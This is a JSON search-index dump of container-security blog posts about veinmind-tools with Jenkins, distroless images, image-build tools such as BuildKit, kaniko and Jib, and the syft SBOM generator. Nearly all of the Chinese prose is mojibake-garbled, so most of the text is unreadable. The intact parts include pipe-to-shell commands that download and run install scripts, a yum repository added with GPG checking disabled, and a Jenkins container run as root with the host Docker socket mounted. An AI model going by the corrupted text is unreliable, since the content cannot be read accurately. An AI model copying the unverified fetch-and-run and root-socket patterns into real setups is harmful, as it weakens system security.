å¹³å°ä¸‹ï¼Œæ·»åŠ é—®è„‰ SDK çš„ yum ä»“åº“å³å¯å®‰è£…æ‰€éœ€è½¯ä»¶åŒ…ï¼š\nsudo cat &gt; &#x2F;etc&#x2F;yum.repos.d&#x2F;libveinmind.repo &lt;&lt; &#x3D;&#x3D;EOF&#x3D;&#x3D;\n[libveinmind]\nname&#x3D;libVeinMind SDK yum repository\nbaseurl&#x3D;https:&#x2F;&#x2F;download.veinmind.tech&#x2F;libveinmind&#x2F;yum&#x2F;\nenabled&#x3D;1\ngpgcheck&#x3D;0\n&#x3D;&#x3D;EOF&#x3D;&#x3D;\nsudo yum install libveinmind-devel\nå¼€å‘æŒ‡å—\nAPI æ–‡æ¡£åŠä½¿ç”¨æ ·ä¾‹ï¼ˆGolangã€Python3ï¼‰\næ’ä»¶ç³»ç»Ÿï¼ˆå¦‚ä½•å¼€å‘å¯å¤ç”¨çš„å®¹å™¨å®‰å…¨å·¥å…·ï¼‰\nå¹³è¡Œå®¹å™¨ï¼ˆå¦‚ä½•å®¹å™¨åŒ–éƒ¨ç½²å®¹å™¨å®‰å…¨å·¥å…·ï¼‰\n\n0x07Veinmind Jenkinsveinmind-jenkinså¯ä»¥å¿«é€Ÿé›†æˆÂ veinmind-runnerÂ æ‰«æèƒ½åŠ›åˆ°æ‚¨çš„CIä¸­\nquick start\næ”¯æŒè‡ªåŠ¨æ‰«ææ¨¡å¼ï¼Œæ— éœ€ä¿®æ”¹Jenkinsfileæ–‡ä»¶æˆ–BuildStepï¼Œè‡ªåŠ¨è¯†åˆ«docker buildçš„åŠ¨ä½œï¼Œè§¦å‘æ‰«æä»»åŠ¡ã€‚\næ”¯æŒæ‰‹åŠ¨æ¨¡å¼ï¼Œå¯ä»¥æ‰‹åŠ¨å¢åŠ Build Step&#x2F;Pipeline Stepæ¥æ‰‹åŠ¨è§¦å‘æ‰«æã€‚\nç®€ä¾¿å®‰è£…ï¼Œä¸€æ¬¡å®‰è£…ï¼Œæ°¸ä¹…ä½¿ç”¨ã€‚\nä½¿ç”¨ç®€å•ï¼Œæ— éœ€è®°ä½å¤æ‚çš„å‚æ•°ï¼Œé¼ æ ‡é…ç½®å³å¯ã€‚\næ”¯æŒé˜»æ–­åŠŸèƒ½ã€‚\næä¾›æ•°æ®ç»Ÿè®¡å’Œè¯¦æƒ…é¡µé¢ã€‚\n\né€‚é…æ€§Veinmind Scanner éœ€è¦å¦‚ä¸‹çš„æ¡ä»¶ã€‚\n\nJenkins æ”¯æŒç‰ˆæœ¬ &gt; v2.332.4\n\nå¯¹äºè‡ªåŠ¨æ‰«æåŠŸèƒ½ï¼Œç›®å‰æ”¯æŒçš„è‡ªåŠ¨æ‰«æçš„æ–¹æ³•:\n\n\n\n\n\næ’ä»¶åç§°\nJobç±»å‹\næ˜¯å¦æ”¯æŒAuto\n\n\n\nLinux Shell\nFreeStyle\nâœ…\n\n\nDocker plugin\nFreeStyle\nâœ…\n\n\nDocker build step\nFreeStyle\nâœ…\n\n\nPipeline Shell(sh)\nPipeline\nâœ…\n\n\nDocker Pipeline\nPipeline\nâœ…\n\n\nUsageç•¥ï¼Œè¯¦è§GitHub\nReferencesVeinmind åœ¨ Jenkins çš„0éƒ¨ç½²æˆæœ¬è‡ªåŠ¨åŒ–æ‰«ææ–¹æ¡ˆ\n","slug":"veinmind-tools","date":"2022-09-13T08:44:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"CI/CD,å®¹å™¨å®‰å…¨,é•œåƒå®‰å…¨,é•¿äº­ç§‘æŠ€","author_index":"Moses"},{"id":"d761d3905282bd119994c0c8a6e0235c","title":"å®¹å™¨é•œåƒæ„å»ºä¸åˆ†å‘çš„æŠ€æœ¯å®è·µä¸å®‰å…¨æ€ç´¢","content":"å®¹å™¨é•œåƒæ„å»ºä¸åˆ†å‘çš„æŠ€æœ¯å®è·µä¸å®‰å…¨æ€ç´¢BackendDocker èƒ½å¼•çˆ†å®¹å™¨ï¼Œä¸»è¦åŸå› æ˜¯å®ƒå¸¦æ¥äº†é•œåƒå’Œé•œåƒåˆ†å‘æŠ€æœ¯ã€‚ å®¹å™¨è¿è¡Œæ—¶æ˜¯ Kubernetes å¹³å°çš„åŸºç¡€ç»„ä»¶ï¼Œé•œåƒåˆ™æ˜¯å®¹å™¨çš„é™æ€æ–‡ä»¶ï¼Œå®¹å™¨ç”±é•œåƒåˆ›å»ºã€‚åœ¨ Kubernetes å¹³å°ä¸­ï¼Œæˆ‘ä»¬äº¤ä»˜çš„æ‰€æœ‰åº”ç”¨ï¼Œæœ€ç»ˆéƒ½æ˜¯ä»¥é•œåƒå½¢å¼äº¤ä»˜çš„ï¼Œé•œåƒçš„æ„å»ºä¸åˆ†å‘ï¼Œç›´æ¥å½±å“ CI&#x2F;CD çš„å®Œæˆåº¦ã€‚æ‰€ä»¥ï¼Œé•œåƒä¹Ÿæ˜¯ Kubernetes å¹³å°çš„é‡è¦åŸºç¡€ã€‚\né•œåƒçš„æ¥æºé•œåƒçš„æ¥æºä¸€èˆ¬æœ‰ä¸¤ç§å½¢å¼ã€‚ä¸€ç§æ˜¯é€šè¿‡æ„å»ºç”Ÿæˆé•œåƒï¼Œåœ¨åŸºç¡€é•œåƒä¸Šæ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰çš„å†…å®¹åŠé…ç½®ï¼Œåˆ¶ä½œå‡ºä¸šåŠ¡é•œåƒï¼Œå¦‚åŸºäº JDK åŸºç¡€é•œåƒæ„å»º Java ç¨‹åºçš„åº”ç”¨é•œåƒã€‚å¦ä¸€ç§æ˜¯ä»é•œåƒä»“åº“è·å–åˆ«äººåˆ¶ä½œå¥½çš„é•œåƒï¼Œå¾ˆå¤šå¸¸ç”¨è½¯ä»¶æˆ–ç³»ç»Ÿéƒ½ä¼šæœ‰å®˜æ–¹åˆ¶ä½œå¥½çš„é•œåƒï¼Œå­˜å‚¨åœ¨å…¬å¼€çš„é•œåƒä»“åº“ä¸­ï¼Œå¦‚ rockyã€nginxã€redis ç­‰ï¼Œä½ å¯ä»¥åœ¨Â Docker HubÂ æœç´¢å¹¶ä¸‹è½½å®ƒä»¬ã€‚\nå…³äºå…å‘è¡Œç‰ˆå®¹å™¨çš„æ¦‚å¿µå¤§ä½“æ¦‚å¿µæ˜¯å°†åº”ç”¨ç¨‹åºæ‰“åŒ…åˆ°å®¹å™¨é•œåƒä¸­ï¼ŒåŒæ—¶å°½å¯èƒ½å¤šåœ°åˆ é™¤æ“ä½œç³»ç»Ÿï¼ˆè½¯ä»¶åŒ…ç®¡ç†å™¨ã€åº“ã€shellç­‰ï¼‰å¦‚è°·æ­Œçš„[[å®¹å™¨é•œåƒæ„å»ºä¸åˆ†å‘çš„æŠ€æœ¯å®è·µä¸å®‰å…¨æ€ç´¢#åŸºç¡€é•œåƒ-Distroless]].ä½†æ˜¯ï¼Œå°±Linuxå‘è¡Œç‰ˆæ¥è¯´æ˜¯ç”±ä¸¤ä¸ªä¸»è¦ç»„ä»¶ç»„æˆçš„ï¼šå†…æ ¸å’Œç”¨æˆ·ç©ºé—´ã€‚å†…æ ¸ç›¸å¯¹å®¹å™¨ç†è§£ï¼Œå®ƒæ˜¯æ˜¯ä¸ªç¡¬ä»¶æˆ–è™šæ‹Ÿæœºè¿è¡Œçš„ç‰¹æ®Šç¨‹åºã€‚ç”¨æˆ·ç©ºé—´æœ‰ç‚¹éš¾ä»¥ç†è§£ã€‚ç”¨æˆ·ç©ºé—´åŒ…æ‹¬åœ¨å®¹å™¨é•œåƒä¸­çœ‹åˆ°çš„æ‰€æœ‰å†…å®¹ï¼Œå¦‚Cåº“ï¼ˆglibc)ã€WebæœåŠ¡å™¨ã€åŠ å¯†åº“ã€æ—¶åŒºæ•°æ®ã€åŒºåŸŸè®¾ç½®æ•°æ®ï¼ˆè¯­è¨€ï¼‰ç­‰ã€‚ç”¨æˆ·ç©ºé—´æ— æ³•çœŸæ­£ä»å‘è¡Œç‰ˆå®¹å™¨é•œåƒä¸­åˆ é™¤ï¼Œæ— å‘è¡Œç‰ˆé•œåƒå¿…é¡»å§‹ç»ˆåœ¨å†…æ ¸ä¸Šè¿è¡Œã€‚å³ä½¿è°·æ­Œçš„[[å®¹å™¨é•œåƒæ„å»ºä¸åˆ†å‘çš„æŠ€æœ¯å®è·µä¸å®‰å…¨æ€ç´¢#åŸºç¡€é•œåƒ-Distroless]]é¡¹ç›®ä¹Ÿä¾èµ–Debianæ¥æ»¡è¶³ç”¨æˆ·ç©ºé—´è¦æ±‚ã€‚ when can we expect distroless based on bullseye? Â· Issue #780 Â· GoogleContainerTools&#x2F;distroless Â· GitHubå³ä½¿åœ¨æ— å‘è¡Œç‰ˆçš„å®¹å™¨é•œåƒä¸­ï¼Œæƒ³Javaè™šæ‹Ÿæœºã€Pythonå’Œnode.jsç­‰å†…å®¹ä¹Ÿæ˜¯æ ¹æ®Cåº“ç¼–è¯‘çš„ï¼Œè¯¥åº“æ˜¯è¿™äº›ç”¨æˆ·ç©ºé—´ç¨‹åºå¯ä»¥è®¿é—®Linuxå†…æ ¸ä¸­çš„ä½çº§åŠŸèƒ½ï¼ˆç½‘ç»œå¥—æ¥å­—ã€å­˜å‚¨ã€æ–‡ä»¶ç­‰ï¼‰\nChallengeä¼ä¸šä¸­å“ªä¸ªéƒ¨é—¨è´Ÿè´£æ„å»ºé•œåƒdockerçš„å®‰å…¨é—®é¢˜\nÂ Docker daemon (Docker in Docker)\nÂ Docker Unix socketä»ä¸»æœºæŒ‚è½½åˆ°æ„å»ºå®¹å™¨ä¸­\n\næ€§èƒ½é—®é¢˜\nå¤šå¤§ç¨‹åº¦çš„åˆ©ç”¨ç¼“å­˜\nOCIæ ‡å‡†å’ŒK8Sç”Ÿæ€\n\nTheoryåæ¨¡å¼ä¹‹é»„é‡‘åŸºç¡€é•œåƒ\n\n\n\n\n\n\n\n\nâ€¢é»„é‡‘åŸºç¡€é•œåƒ (golden base image)ï¼šæˆ‘ä»¬é¢„å…ˆé…ç½®å¥½çš„é•œåƒï¼Œä½œä¸ºæ„å»ºåº”ç”¨ç¨‹åºé•œåƒçš„åŸºç¡€é•œåƒã€‚â€¢åæ¨¡å¼ (antipattern)Â ï¼šåœ¨å®è·µä¸­ç»å¸¸å‡ºç°ä½†ä½æ•ˆæˆ–æ˜¯æœ‰å¾…ä¼˜åŒ–çš„è®¾è®¡æ¨¡å¼ã€‚\né»„é‡‘é•œåƒçš„æ¦‚å¿µä½œä¸ºæœ€å¸¸è§çš„åŸºç¡€å®¹å™¨å®‰å…¨æ§åˆ¶çš„æ€è·¯ï¼Œé€šè¿‡é¢„å…ˆé…ç½®å¥½çš„åŸºç¡€é•œåƒæ„å»ºä¼ä¸šåº”ç”¨ç¨‹åºçš„é•œåƒï¼Œé•œåƒçš„å·¥å…·å’Œåº“éƒ½ç»è¿‡äº†ä¸¥æ ¼çš„å®¡æ ¸ã€‚éœ€è¦æ£€æŸ¥ã€ç»´æŠ¤ç›¸å…³è½¯ä»¶çš„å®‰å…¨çŠ¶æ€ï¼Œå¹¶ä¸”è¦å®¡æ ¸ä½¿ç”¨éé»„é‡‘é•œåƒæ„å»ºçš„åº”ç”¨é•œåƒï¼Œå¯èƒ½è¦å¼•å…¥å¯ä¿¡é•œåƒçš„æ¦‚å¿µå’Œæ–¹æ³•è®ºè€ƒè™‘åˆ°å½“ä»ç¬¬ä¸‰æ–¹æˆ–å®˜æ–¹è·å–éœ€è¦çš„ä¸Šæ¸¸é•œåƒæ„å»ºåº”ç”¨ç¨‹åºå’Œé…ç½®æ—¶ä¼šå¼•å…¥æ–°çš„ç›¸å…³é—®é¢˜ï¼Œé¦–å…ˆï¼Œä»ä¸Šæ¸¸é•œåƒåˆ°å†…éƒ¨å®šåˆ¶ç‰ˆé•œåƒçš„åˆå§‹è½¬æ¢æ¶‰åŠé¢å¤–å·¥ä½œã€‚å…¶æ¬¡ï¼Œè¿ç»´å›¢é˜Ÿæœ‰è´£ä»»å­˜å‚¨å’Œç»´æŠ¤è¿™äº›å†…éƒ¨é•œåƒã€‚åœ¨å…¸å‹ç¯å¢ƒä¸­ï¼Œä½¿ç”¨çš„é•œåƒæ•°é‡ä¼šè¶Šæ¥è¶Šå¤šï¼Œæ¶‰åŠçš„é¢å¤–å·¥ä½œä¹Ÿéšä¹‹å¢åŠ ï¼Œæœ€ç»ˆå¯¼è‡´æ›´ä¸¥å³»çš„å®‰å…¨çŠ¶å†µï¼Œå¦‚é•œåƒçš„æ›´æ–°æ“ä½œï¼Œå³ä½¿æœ‰ï¼Œé¢‘ç‡ä¹Ÿä¼šå¾ˆä½ã€‚\né»„é‡‘é•œåƒçš„ä¸€äº›è¦æ±‚ï¼š\n\nç¡®ä¿å®‰è£…äº†ç‰¹å®šçš„è½¯ä»¶\nç¡®ä¿ä¸å­˜åœ¨æ˜“å—æ”»å‡»çš„åº“\nç¡®ä¿ç”¨æˆ·å…·æœ‰æ­£ç¡®çš„æƒé™\n\nè¯„ä¼°é»„é‡‘é•œåƒçš„åŸåˆ™ï¼š\n\nç¡®ä¿é•œåƒç”±ä¿¡èª‰è‰¯å¥½çš„ç»„ç»‡å‘å¸ƒã€‚ä¸èƒ½éšä¾¿ä» DockerHub æˆ–å…¶ä»–å…¬å¼€çš„é•œåƒæ³¨å†Œè¡¨çš„æŸä¸ªä»“åº“ä¸‹è½½é•œåƒï¼Œå› ä¸ºè¿™äº›é•œåƒå°†æ˜¯æ„å»ºåº”ç”¨ç¨‹åºé•œåƒçš„åŸºç¡€ã€‚\nä¼˜å…ˆé€‰æ‹©æŒç»­æ›´æ–°çš„é•œåƒã€‚åŸºç¡€é•œåƒé€šå¸¸åŒ…å«å·¥å…·å’Œåº“ï¼Œå‘ç°æ¼æ´æ—¶ï¼Œå¿…é¡»æ‰“è¡¥ä¸ã€‚\né¦–é€‰å¼€æºäº†æ„å»ºè¿‡ç¨‹æˆ–è§„èŒƒçš„é•œåƒã€‚é€šå¸¸æ˜¯ Dockerfile æ–‡ä»¶ï¼Œä½ å¯ä»¥é€šè¿‡å®ƒäº†è§£é•œåƒæ˜¯å¦‚ä½•æ„å»ºçš„ã€‚\né¿å…ä½¿ç”¨åŒ…å«ä¸å¿…è¦å·¥å…·æˆ–åº“çš„é•œåƒã€‚é¦–é€‰æœ€å°åŒ–é•œåƒï¼Œè¿™äº›é•œåƒå ç”¨çš„ç©ºé—´å¾ˆå°ï¼Œå¿…è¦æ—¶å¼€å‘äººå‘˜å¯ä»¥åœ¨å…¶ä¸Šè¿›è¡ŒäºŒæ¬¡æ„å»ºã€‚\n\nåŸºç¡€é•œåƒ-Distrolessè°·æ­Œç°åœ¨é€šè¿‡æä¾› Distroless é•œåƒå‘å…¨ä¸–ç•Œå¼€æ”¾è¿™ç§èƒ½åŠ›ã€‚è°·æ­Œæ„å»ºçš„è¿™äº›é•œåƒçš„ç›®æ ‡æ˜¯åªåŒ…å«ä½ çš„åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–é¡¹ï¼ŒåŒæ—¶å®ƒä»¬å°†æ²¡æœ‰å¸¸è§„ Linux å‘è¡Œç‰ˆçš„æ‰€æœ‰ç‰¹æ€§ï¼ŒåŒ…æ‹¬ shellã€‚\nè¿™æ„å‘³ç€è™½ç„¶å¯ä»¥æƒ³ä»¥å‰ä¸€æ ·è¿è¡Œåº”ç”¨ç¨‹åºçš„å®¹å™¨ï¼Œä½†ä¸èƒ½åœ¨å®¹å™¨è¿è¡Œçš„æ—¶å€™è¿›å…¥å®¹å™¨å†…ã€‚è¿™æ˜¯ä¸€ä¸ªé‡å¤§çš„å®‰å…¨æ”¹è¿›ï¼Œå› ä¸ºä½ ç°åœ¨å·²ç»ä¸ºé»‘å®¢é€šè¿‡ shell è¿›å…¥ä½ çš„å®¹å™¨å…³ä¸Šäº†å¤§é—¨ã€‚\nä»¥ä¸‹åŸºç¡€é•œåƒæ˜¯æ­£å¼å‘å¸ƒçš„ç‰ˆæœ¬ï¼šç›®å‰æœ€æ–°ç‰ˆæœ¬æ”¯æŒdebian11\n\ngcr.io&#x2F;distroless&#x2F;static-debian10\ngcr.io&#x2F;distroless&#x2F;base-debian10\ngcr.io&#x2F;distroless&#x2F;java-debian10\ngcr.io&#x2F;distroless&#x2F;cc-debian10\ngcr.io&#x2F;distroless&#x2F;nodejs-debian10\n\nä¸‹é¢çš„åŸºç¡€é•œåƒä»åœ¨å®éªŒé˜¶æ®µï¼Œä¸æ¨èç”¨äºç”Ÿäº§ç¯å¢ƒï¼š\n\ngcr.io&#x2F;distroless&#x2F;python2.7-debian10\ngcr.io&#x2F;distroless&#x2F;python3-debian10\ngcr.io&#x2F;distroless&#x2F;java&#x2F;jetty-debian10\ngcr.io&#x2F;distroless&#x2F;dotnet\n\nexample# Start by building the application.\nFROM golang:1.18 as build\n\nWORKDIR &#x2F;go&#x2F;src&#x2F;app\nCOPY . .\n\nRUN go mod download\nRUN CGO_ENABLED&#x3D;0 go build -o &#x2F;go&#x2F;bin&#x2F;app\n\n# Now copy it into our base image.\nFROM gcr.io&#x2F;distroless&#x2F;static-debian11\nCOPY --from&#x3D;build &#x2F;go&#x2F;bin&#x2F;app &#x2F;\nCMD [&quot;&#x2F;app&quot;]\n\n\nå…³äºç½‘ç»œå‚è€ƒä¸‹è½½ç¦»çº¿é•œåƒï¼Œä½¿ç”¨äº‘æœåŠ¡å™¨æˆ–è€…æœ‰ğŸªœæ¡ä»¶çš„æœåŠ¡å™¨è·å–é•œåƒã€‚\nå…³äºè°ƒè¯•# Start by building the application.\nFROM golang:1.18 as build\n\nWORKDIR &#x2F;go&#x2F;src&#x2F;app\nCOPY . .\n\nRUN go mod download\nRUN CGO_ENABLED&#x3D;0 go build -o &#x2F;go&#x2F;bin&#x2F;app\n\n# åœ¨é•œåƒåæ·»åŠ  debug æ ‡ç­¾å¼€å¯è°ƒè¯•æ¨¡å¼\nFROM gcr.io&#x2F;distroless&#x2F;base:debug\nCOPY --from&#x3D;build &#x2F;go&#x2F;bin&#x2F;app &#x2F;\nCMD [&quot;&#x2F;app&quot;]\n\nTools-æ„å»ºå®¹å™¨çš„å·¥å…·BuildKitBuildKitÂ æ˜¯ä¸‹ä¸€ä»£çš„é•œåƒæ„å»ºç»„ä»¶ï¼Œåœ¨Â https://github.com/moby/buildkitÂ å¼€æºã€‚\næ³¨æ„ï¼šå¦‚æœæ‚¨çš„é•œåƒæ„å»ºä½¿ç”¨çš„æ˜¯äº‘æœåŠ¡å•†æä¾›çš„é•œåƒæ„å»ºæœåŠ¡ï¼ˆè…¾è®¯äº‘å®¹å™¨æœåŠ¡ã€é˜¿é‡Œäº‘å®¹å™¨æœåŠ¡ç­‰ï¼‰ï¼Œç”±äºä¸Šè¿°æœåŠ¡æä¾›å•†çš„ Docker ç‰ˆæœ¬ä½äº 18.09ï¼ŒBuildKit æ— æ³•ä½¿ç”¨ï¼Œå°†é€ æˆé•œåƒæ„å»ºå¤±è´¥ã€‚buildå»ºè®®ä½¿ç”¨ BuildKit æ„å»ºé•œåƒæ—¶ä½¿ç”¨ä¸€ä¸ªæ–°çš„ Dockerfile æ–‡ä»¶ï¼ˆä¾‹å¦‚ Dockerfile.buildkitï¼‰\nç›®å‰ï¼ŒDocker Hub è‡ªåŠ¨æ„å»ºå·²ç»æ”¯æŒ buildkitï¼Œå…·ä½“è¯·å‚è€ƒÂ https://github.com/docker-practice/docker-hub-buildx\nCloud Native Buildpacksï¼ˆCNBï¼‰kanikokaniko æ˜¯ä¸€ä¸ªåœ¨å®¹å™¨æˆ– Kubernetes é›†ç¾¤å†…ä» Dockerfile æ„å»ºå®¹å™¨é•œåƒçš„å·¥å…· ( Build Container Images In Kubernetes )ã€‚\n\n\n\n\n\n\n\n\n\nç”±äº kaniko ä¸ä¾èµ–äº Docker å®ˆæŠ¤è¿›ç¨‹ï¼Œå¹¶ä¸”å®Œå…¨åœ¨ç”¨æˆ·ç©ºé—´ä¸­æ‰§è¡Œ Dockerfile ä¸­çš„æ¯ä¸ªå‘½ä»¤ï¼Œè¿™ä½¿å¾—èƒ½å¤Ÿåœ¨è½»æ¾æˆ–å®‰å…¨åœ°è¿è¡Œåœ¨æ— Dockerå®ˆæŠ¤ç¨‹åºçš„ç¯å¢ƒï¼ˆå¦‚æ ‡å‡†Kubernetesé›†ç¾¤ V1.24.xï¼‰ä¸­æ„å»ºå®¹å™¨æ˜ åƒã€‚åœ¨ Kubernetes V1.24.x ç‰ˆæœ¬ä¹‹åé»˜è®¤é‡‡ç”¨Â containerd.ioÂ ä½œä¸ºç¼ºçœçš„criï¼Œä¸åœ¨æ”¯æŒ docker-shim æ„å‘³ç€æˆ‘ä»¬ä¸éœ€è¦å®‰è£… docker ç¯å¢ƒ\nBazelå¾…è¡¥å……\nimgå¾…è¡¥å……\njibå¦‚æœä½ æ˜¯åœ¨ Java ç¯å¢ƒä¸‹é¢ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ Jib æ¥æ„å»ºé•œåƒï¼ŒJib ä¹Ÿæ˜¯ Google å¼€æºçš„ï¼Œåªæ˜¯æ˜¯é’ˆå¯¹ Java å®¹å™¨é•œåƒæ„å»ºçš„å·¥å…·ã€‚é€šè¿‡ä½¿ç”¨ Jibï¼ŒJava å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨ä»–ä»¬ç†Ÿæ‚‰çš„ Java å·¥å…·æ¥æ„å»ºé•œåƒã€‚Jib æ˜¯ä¸€ä¸ªå¿«é€Ÿè€Œç®€å•çš„å®¹å™¨é•œåƒæ„å»ºå·¥å…·ï¼Œå®ƒè´Ÿè´£å¤„ç†å°†åº”ç”¨ç¨‹åºæ‰“åŒ…åˆ°å®¹å™¨é•œåƒä¸­æ‰€éœ€çš„æ‰€æœ‰æ­¥éª¤ï¼Œå®ƒä¸éœ€è¦ä½ ç¼–å†™ Dockerfile æˆ–å®‰è£… Dockerï¼Œè€Œä¸”å¯ä»¥ç›´æ¥é›†æˆåˆ° Maven å’Œ Gradle ä¸­ï¼Œåªéœ€è¦å°†æ’ä»¶æ·»åŠ åˆ°æ„å»ºä¸­ï¼Œå°±å¯ä»¥ç«‹å³å°† Java åº”ç”¨ç¨‹åºå®¹å™¨åŒ–ã€‚\nJib åˆ©ç”¨äº† Docker é•œåƒçš„åˆ†å±‚æœºåˆ¶ï¼Œå°†å…¶ä¸æ„å»ºç³»ç»Ÿé›†æˆï¼Œå¹¶é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¼˜åŒ– Java å®¹å™¨é•œåƒçš„æ„å»ºï¼š\n\nç®€å•ï¼šJib ä½¿ç”¨ Java å¼€å‘ï¼Œå¹¶ä½œä¸º Maven æˆ– Gradle çš„ä¸€éƒ¨åˆ†è¿è¡Œã€‚ä½ ä¸éœ€è¦ç¼–å†™ Dockerfile æˆ–è¿è¡Œ Docker å®ˆæŠ¤è¿›ç¨‹ï¼Œç”šè‡³æ— éœ€åˆ›å»ºåŒ…å«æ‰€æœ‰ä¾èµ–çš„å¤§ JAR åŒ…ã€‚å› ä¸º Jib ä¸ Java æ„å»ºè¿‡ç¨‹ç´§å¯†é›†æˆï¼Œæ‰€ä»¥å®ƒå¯ä»¥è®¿é—®åˆ°æ‰“åŒ…åº”ç”¨ç¨‹åºæ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ã€‚\n\nå¿«é€Ÿï¼šJib åˆ©ç”¨é•œåƒåˆ†å±‚å’Œç¼“å­˜æ¥å®ç°å¿«é€Ÿã€å¢é‡çš„æ„å»ºã€‚å®ƒè¯»å–ä½ çš„æ„å»ºé…ç½®ï¼Œå°†ä½ çš„åº”ç”¨ç¨‹åºç»„ç»‡åˆ°ä¸åŒçš„å±‚ï¼ˆä¾èµ–é¡¹ã€èµ„æºã€ç±»ï¼‰ä¸­ï¼Œå¹¶åªé‡æ–°æ„å»ºå’Œæ¨é€å‘ç”Ÿå˜æ›´çš„å±‚ã€‚åœ¨é¡¹ç›®è¿›è¡Œå¿«é€Ÿè¿­ä»£æ—¶ï¼ŒJib åªå°†å‘ç”Ÿå˜æ›´çš„å±‚ï¼ˆè€Œä¸æ˜¯æ•´ä¸ªåº”ç”¨ç¨‹åºï¼‰æ¨é€åˆ°é•œåƒä»“åº“æ¥èŠ‚çœå®è´µçš„æ„å»ºæ—¶é—´ã€‚\n\nå¯é‡ç°ï¼šJib æ”¯æŒæ ¹æ® Maven å’Œ Gradle çš„æ„å»ºå…ƒæ•°æ®è¿›è¡Œå£°æ˜å¼çš„å®¹å™¨é•œåƒæ„å»ºï¼Œå› æ­¤ï¼Œåªè¦è¾“å…¥ä¿æŒä¸å˜ï¼Œå°±å¯ä»¥é€šè¿‡é…ç½®é‡å¤åˆ›å»ºç›¸åŒçš„é•œåƒã€‚\n\n\nReferenceså®¹å™¨é•œåƒæ„å»ºä¸åˆ†å‘å¦‚ä½•ä½¿ç”¨ Distroless è®©ä½ çš„å®¹å™¨æ›´åŠ å®‰å…¨ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ä½¿ç”¨ä»¥è¯­è¨€ä¸ºä¸­å¿ƒçš„å®¹å™¨åŸºç¡€é•œåƒ distroless - çŸ¥ä¹ç®€å•çš„ Kubernetes é›†ç¾¤æ­å»º - è‹æ´‹åšå®¢Distroless Docker images | Technology Radar | Thoughtworkså¦‚ä½•ä½¿ç”¨ Distroless è®©ä½ çš„å®¹å™¨æ›´åŠ å®‰å…¨ - SegmentFault æ€å¦ä¸¢å¼ƒæ‰‹ä¸­çš„docker build ï¼Œä½¿ç”¨Kanikoç›´æ¥åœ¨K8Sé›†ç¾¤æˆ–Containerdç¯å¢ƒæ„å»ºæ¨é€å®¹å™¨é•œåƒå¸¸ç”¨å®¹å™¨é•œåƒæ„å»ºå·¥å…·å’Œæ–¹æ¡ˆä»‹ç»Harden Your Containers with Distroless Docker Images | Better ProgrammingWhy distroless containers arenâ€™t the security solution you think they areDo Linux distributions still matter with containers?Distroless Docker images | Technology Radar | Thoughtworkså¯ä»¥åƒ Docker ä¸€æ ·æ–¹ä¾¿çš„ä½¿ç”¨ Containerd å—ï¼Ÿ\n","slug":"å®¹å™¨é•œåƒæ„å»ºä¸åˆ†å‘çš„æŠ€æœ¯å®è·µä¸å®‰å…¨æ€ç´¢","date":"2022-09-01T06:34:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"å®¹å™¨é•œåƒå®‰å…¨,Distroless,buidlkit,CNB","author_index":"Moses"},{"id":"5d3847e382c5758f0e662a8985f6d419","title":"è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·-syft","content":"syft0x01ç®€ä»‹syftGitHub aboutï¼šCLI tool and library for generating a Software Bill of Materials from container images and filesystemså…¶ä»–ä¿¡æ¯\n\né¡¹ç›®ç”±anchoreå¼€æº\ngrype![[SBOMå·¥å…·ä»‹ç»#Anchore]]\n\n0x02æ¶æ„å›¾\n0x03æ ¸å¿ƒèƒ½åŠ›Features\nGenerates SBOMs for container images, filesystems, archives, and more to discover packages and libraries\nSupports OCI and Docker image formats\nLinux distribution identification\nWorks seamlessly withÂ GrypeÂ (a fast, modern vulnerability scanner)\nAble to create signed SBOM attestations using theÂ in-toto specification\nConvert between SBOM formats, such as CycloneDX, SPDX, and Syftâ€™s own format.\n\n0x04æ”¯æŒç”Ÿæ€\nAlpine (apk)\nC (conan)\nC++ (conan)\nDart (pubs)\nDebian (dpkg)\nDotnet (deps.json)\nObjective-C (cocoapods)\nGo (go.mod, Go binaries)\nHaskell (cabal, stack)\nJava (jar, ear, war, par, sar)\nJavaScript (npm, yarn)\nJenkins Plugins (jpi, hpi)\nPHP (composer)\nPython (wheel, egg, poetry, requirements.txt)\nRed Hat (rpm)\nRuby (gem)\nRust (cargo.lock)\nSwift (cocoapods)\n\n0x05Quickstartrequireinstall# linux\ncurl -sSfL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;anchore&#x2F;syft&#x2F;main&#x2F;install.sh | sh -s -- -b &#x2F;usr&#x2F;local&#x2F;bin\n# macos\nbrew tap anchore&#x2F;syft\nbrew install syft\n\n\n\nè¿›é˜¶-jenkinsé›†æˆinstall dockersudo apt-get install docker.io -y\nsudo systemctl enable docker\nsudo systemctl start docker\nsudo usermod -aG docker $USER\ndeploy jenkins via dockerdocker run -u root -d --name jenkins --rm -p 8080:8080 -p 50000:50000 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -v &#x2F;tmp&#x2F;jenkins-data:&#x2F;var&#x2F;jenkins_home jenkinsci&#x2F;blueocean\ninstall syft &amp; grype[root@tvy-base-worker-02 ~]# docker exec 1c5a bash -c &#39;curl -sSfL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;anchore&#x2F;syft&#x2F;main&#x2F;install.sh | sh -s -- -b &#x2F;usr&#x2F;local&#x2F;bin&#39;\n[root@tvy-base-worker-02 ~]# docker exec 1c5a bash -c &#39;curl -sSfL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;anchore&#x2F;grype&#x2F;main&#x2F;install.sh | sh -s -- -b &#x2F;usr&#x2F;local&#x2F;bin&#39;\nGenerating SBOM\nDefinition â€“ Pipeline script from SCM\nSCM â€“ Git\nRepository URL â€“ https://github.com/pvnovarese/syft-sbom-demo (although you can use any GitHub repository for this demo).\n\npublish sbom to dependency-trackuse format CycloneDX 1.4 XML publish DT, just like docker sbom![[dockeré•œåƒå®‰å…¨çš„æ£€æŸ¥#Docker 